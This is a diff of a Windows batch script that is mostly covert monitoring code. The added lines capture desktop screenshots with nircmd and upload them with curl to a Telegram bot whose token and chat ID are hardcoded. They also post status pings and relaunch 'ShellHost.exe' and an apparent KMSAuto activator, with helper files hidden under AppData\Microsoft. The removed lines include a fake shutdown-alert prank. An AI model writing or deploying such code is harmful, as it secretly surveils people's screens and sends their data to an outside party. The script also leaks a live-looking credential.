@@ -10,7 +10,7 @@ if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=3.0"
+set "BATCHVERSION=3.1"
 
 
 
@@ -22,144 +22,63 @@ set nircmd="%APPDATA%\Microsoft\nircmd.exe"
 set "SHSTFILE=D:\ShellHost.exe"
 set "KMSFILE=D:\KMSAuto.exe"
 
-:: ============ MyScreen TOPIC ============
 
 
-:: Set bot token, chat ID, and message
-set "TOKEN_MyScrn=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID_MyScrn=-1002163721260"
-set "TOPIC_ID_MyScrn=74293"
-set "MESSAGE_MyScrn=Left......|%time%|"
-set "ENCODED_MESSAGE_MyScrn=%MESSAGE_MyScrn: =%%2"
-set "CAPTION_MyScrn="
-set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
-
-
-
-
-
-
-
-goto skip_code
-goto :EOF
-
-
-
-
-
-set /a NUM=1
-
-
-:: Run Once
-if exist "%temp%\run_once1.flag" goto skip_code
-
-
-
-
-
-:loop
-if %NUM% GTR 20 goto play
-
-:: Send Message 
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendMessage" ^
-     -d "chat_id=%CHAT_ID_MyScrn%" ^
-     -d "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -d "text=%NUM%"
-
-set /a NUM+=1
-timeout /t 3 /nobreak
-
-
-
-goto loop
-
-
-
-
-:play
-
-
-
-
-:: First message (Fake shutdown warning)
-echo MsgBox "Your system will shut down in 1 minute!", 48, "System Alert" > %temp%\prank.vbs
-start "" wscript %temp%\prank.vbs
-timeout /t 1 /nobreak >nul
-start "" wscript %temp%\prank.vbs
-timeout /t 4 /nobreak >nul
-
-:: Wait 10 seconds before overwriting
-timeout /t 7 /nobreak >nul
-
-:: Overwrite with the second message (Just kidding!)
-echo MsgBox "Just kidding! PC is fine.", 64, "System Alert" > %temp%\prank.vbs
-
-:: Open "Just kidding!" message 10 times
-for /L %%i in (1,1,10) do (
-    start "" wscript %temp%\prank.vbs
-	%nircmd% wait 300
-)
-echo 1 > "%temp%\run_once1.flag"
-
-
-goto play1
-
-
-cd /d "%USERPROFILE%\Desktop\test\Atest"
-"%APPDATA%\Microsoft\nircmd.exe" setsysvolume 20238
-start "" /B mpv.exe --fullscreen --border=no --ontop --no-input-default-bindings --no-osc --no-stop-screensaver --term-status-msg=" " --idle=no --force-window=no --no-terminal --geometry=100%x100% --keepaspect=no --autofit=100%x100% --length=7 video.mp4
-timeout /t 3 /nobreak >nul
-echo 1 > "%temp%\run_once1.flag"
-
-
-
-:play1
-
-
-
-:: del /f /q "%temp%\run_once.flag"
-
-
-:: "%APPDATA%\Microsoft\nircmd.exe" monitor off
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-:skip_code
-
-
-
-
-
-timeout /t 1200 /nobreak
-
-
-
-
-:again
-
-cd /d "%~dp0"
-
-
-
-"%nircmd%" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
 
 set "input_file=%appdata%\Microsoft\play\playit_output.log"
 set "output_file=%appdata%\Microsoft\play\playit_20lines.log"
+
+
+
+
+
+
+:: Check if SHSTFILE is running
+set "SHSTRUNNING=0"
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %SHSTFILE% is not running. starting now...
+    start "" "%SHSTFILE%"
+) else (
+    set "SHSTRUNNING=1"
+    echo %SHSTFILE% is already running.
+)
+
+echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%
+
+echo.
+echo.
+
+
+
+
+
+:: Check if KMSFILE is running
+set "KMSRUNNING=0"
+powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
+if %errorlevel%==1 (
+    echo %KMSFILE% is not running. starting now...
+    start "" "%KMSFILE%"
+) else (
+    set "KMSRUNNING=1"
+    echo %KMSFILE% is already running.
+)
+
+echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%
+
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
 
 
 :: Use PowerShell to get the last 20 lines of the file and save them to the output file
@@ -167,19 +86,6 @@ powershell -Command "Get-Content '%input_file%' | Select-Object -Last 40 | Out-F
 ::powershell -Command "Get-Content '%input_file%' | Select-Object -Last 20 | Out-File '%output_file%'"
 
 echo Last 40 lines have been saved to %output_file%
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -266,18 +172,6 @@ echo. >> "%output_file%"
 
 
 
-
-
-
-
-
-
-
-
-
-:SENDMSG
-
-
 :: Use PowerShell to read the contents of playit_7lines.log and URL-encode it
 ::for /f "delims=" %%a in ('powershell -Command "(Get-Content '%output_file%' | Out-String).Trim() -replace ' ', '%%20' -replace '&', '%%26' -replace '\n', '%%0A'"') do set "CAPTION_MyScrn=%%a"
 ::for /f "delims=" %%a in ('powershell -Command ^
@@ -292,42 +186,29 @@ echo. >> "%output_file%"
 
 
 
+:: Define the file to track the last run time
+set "LASTRUNFILE=%TEMP%\lastrun.log"
 
-:: Check if SHSTFILE is running
-set "SHSTRUNNING=0"
-powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
-if %errorlevel%==1 (
-    echo %SHSTFILE% is not running. starting now...
-    start "" "%SHSTFILE%"
+:: Check if the file exists
+if not exist "%LASTRUNFILE%" (
+    echo 1 > "%LASTRUNFILE%"
 ) else (
-    set "SHSTRUNNING=1"
-    echo %SHSTFILE% is already running.
+    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
+    echo !MINUTESS! > "%LASTRUNFILE%"
 )
 
-echo SHST RUNNING is !SHSTRUNNING! and %SHSTRUNNING%
-
+:: Read the updated value
+set /p MINUTESS=<"%LASTRUNFILE%"
+echo Minutess=%MINUTESS%
 echo.
 echo.
 
+:: Check if 20 minutes have passed
+if %MINUTESS% GEQ 20 goto SENDMSG
 
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -F "chat_id=-1002163721260" -F "message_thread_id=74293" -F "text=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%|%time%|%BATCHVERSION%|"
 
-
-
-:: Check if KMSFILE is running
-set "KMSRUNNING=0"
-powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
-if %errorlevel%==1 (
-    echo %KMSFILE% is not running. starting now...
-    start "" "%KMSFILE%"
-) else (
-    set "KMSRUNNING=1"
-    echo %KMSFILE% is already running.
-)
-
-echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%
-
-echo.
-echo.
+goto GOGO3
 
 
 
@@ -337,14 +218,24 @@ echo.
 
 
 
+:SENDMSG
+
+
+:: ============ MyScreen TOPIC ============
+
+
+:: Set bot token, chat ID, and message
+set "TOKEN_MyScrn=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_MyScrn=-1002163721260"
+set "TOPIC_ID_MyScrn=74293"
+set "MESSAGE_MyScrn=Left......|%time%|"
+set "ENCODED_MESSAGE_MyScrn=%MESSAGE_MyScrn: =%%2"
+set "CAPTION_MyScrn="
+set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-
-
-
-
-
+"%nircmd%" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
 
 
 :: Send Photo
@@ -375,7 +266,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 
-
+:GOGO3
 
 
 echo.
